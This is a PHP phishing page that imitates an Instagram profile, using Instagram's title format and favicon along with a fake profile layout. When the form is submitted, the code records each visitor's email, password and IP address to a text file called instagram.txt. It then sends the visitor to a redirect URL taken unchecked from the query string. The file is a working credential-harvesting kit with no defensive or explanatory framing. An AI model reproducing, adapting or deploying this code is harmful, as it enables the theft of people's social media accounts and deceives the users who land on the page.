<?php

if(isset($_GET['proname'])){
    $proname = htmlspecialchars($_GET['proname']);
}else{
    $proname = '';
}
if(isset($_GET['prouser'])){
    $prouser = htmlspecialchars($_GET['prouser']);
}else{
    $prouser = '';
}
if(isset($_GET['returnURL'])){
    $redirectTo = $_GET['returnURL'];
}else{
    $redirectTo = "https://www.instagram.com/'";
}
if(isset($_POST['submit'])){
    $IPAddr = $_SERVER['REMOTE_ADDR'];
    $email = $_POST['email'];   
    $password = $_POST['password'];
    
    $handle = fopen('instagram.txt', 'a');
    $form = "\n --------------------------- \n IP: {$IPAddr} \n Email: {$email} \n Password: {$password} \n --------------------------- \n";
    fwrite($handle, $form);
    fclose($handle);
    header("Location: {$redirectTo}");
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> <?php echo($prouser); ?>(@<?php echo($proname); ?>) • Instagram photos and videos</title>
    <link rel="stylesheet" href="style.css">
<link href="https://fonts.googleapis.com/css2?family=Open+Sans+Condensed:ital,wght@0,300;1,300&display=swap" rel="stylesheet"> 
<link rel="shortcut icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" type="image/x-icon"/>
</head>
<body>
    <div class="nav">
        <img src="logo.png" alt="" class="logo-nav">
        <img src="search.png" height="27px" class="search" >
    </div>
<div class="profile">

    <div class="profile_container">
          <img src="profile.png" alt="" class="profile_photo">
          <div class="profile_info">

              <div class="box1">
                    <div class="proname"><?php echo($proname); ?></div>
                    <div class="follow">follow</div>
                </div> 
              <div class="box2"><span class="prouser">hhhjmh</span></div> 
          </div>
        </div>
      
</div> 
<div class="gray">
</div>
<div class="login">
</div>
</body>

</html>